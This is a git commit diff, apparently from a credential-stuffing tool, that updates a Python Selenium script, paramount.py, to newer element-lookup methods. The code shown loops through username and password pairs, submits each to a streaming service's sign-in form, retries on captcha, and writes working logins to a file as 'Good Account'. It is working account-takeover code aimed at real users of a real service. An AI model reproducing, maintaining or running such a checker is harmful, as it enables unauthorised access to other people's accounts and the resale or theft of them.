3f1d09bde82379791cd8cbc80ff3b52bf489dd0b
g3th <theinkandpen@yahoo.co.uk>
2023-01-12 00:06:59 +0000

    fixed deprecated methods 	modified:   paramount.py

--- paramount.py
+++ paramount.py
@@ -1,6 +1,7 @@
 import time
 import requests
 from selenium import webdriver
+from selenium.webdriver.common.by import By
 from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException, TimeoutException
 from selenium.webdriver.chrome.options import Options
 from headers.paramount_header import header
@@ -34,9 +35,9 @@ while index < len(users):
 				browser.set_window_size(500,700)
 				browser.get(page)
 				time.sleep(2)
-				email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
-				password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
-				sign_in_button = browser.find_element_by_xpath('//*[@id="sign-in-form"]/div/div[3]/button')	
+				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
+				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
+				sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')	
 				#sign_in_button_disabled = sign_in_button.get_attribute('class')
 				#print(sign_in_button_disabled)	
 				email_input_box.send_keys(users[index])
@@ -46,11 +47,11 @@ while index < len(users):
 				if 'data:,' in str(browser.current_url):
 					print(' -- Error: Failed to load')
 					continue
-				if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
+				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
 					print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
 					continue
-				if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p'):
-					invalid_email_text = browser.find_element_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p').text
+				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p'):
+					invalid_email_text = browser.find_element(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p').text
 					if 'Invalid email and/or password' in str(invalid_email_text):
 						print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
 						index +=1
@@ -60,8 +61,8 @@ while index < len(users):
 				if 'home' in str(browser.current_url):
 					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
 					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
-				if browser.find_elements_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]'):
-					valid = browser.find_element_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]').text
+				if browser.find_elements(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]'):
+					valid = browser.find_element(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]').text
 					if "Who's Watching" in str(valid):
 						print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
 						account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
